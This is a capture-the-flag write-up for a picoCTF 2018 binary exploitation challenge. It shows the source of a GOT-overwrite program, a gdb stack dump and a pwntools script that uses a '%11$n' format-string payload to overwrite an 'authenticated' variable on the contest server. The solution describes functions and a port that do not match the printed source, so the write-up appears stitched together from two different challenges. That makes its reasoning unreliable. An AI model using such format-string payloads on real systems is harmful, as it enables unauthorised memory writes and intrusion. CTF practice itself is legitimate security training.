# Problem
Can you authenticate to this [service](https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth) and get the flag? Connect to it with ```nc 2018shell1.picoctf.com 23731```. [Source](https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth.c)

## Hints:
Ever heard of the Global Offset Table?

## Solution:
First we download the files:
```bash
wget https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth
wget https://2018shell1.picoctf.com/static/c65c74a0f13131ba9f0b9497152aedd4/auth.c
chmod +x ./auth
```

Now, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

They let us change one word in memory as we wish.

Hint says to use the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table).

If we override the address of ```puts@got()``` to ```win()```, we will have a shell.


```read_flag()``` will print the flag if ```authenticated``` is not false, the problem is that ```authenticated``` is initialized to ```0``` and never changes (rly?)

We can see that if the input (```buf```) does not contain the substring "yes", it is being printed as a format string. We can use it to override authenticated.

Lets investigate, using this gdbinit file:
```bash
break *0x080487f9
run < <(echo "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x")
x/12wx $esp
x &authenticated

Breakpoint 1, 0x080487f9 in main ()
0xffffce40: 0xffffce6c  0x080489a6  0xf7f965c0  0x0804875a
0xffffce50: 0x00000000  0x00c30000  0x00000000  0xffffcf64
0xffffce60: 0x00000000  0x00000000  0x000003e8  0x41414141
$1 = (int *) 0x804a04c <authenticated>
```

We can see that the string "AAAA" (from our input) is being referenced at the eleventh stack element. We can implement arbitrary memory write now.
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'roeesefi'
pw = '123123'

if debug:
  p = process('./vuln')
else:
  p = remote('2018shell1.picoctf.com', 52918)

print p.recvuntil('Would you like to read the flag? (yes/no)')

payload = p32(0x804a04c) + '.%11$n'

p.sendline(payload)

print p.recvall()
```

Access Granted.

Flag: picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}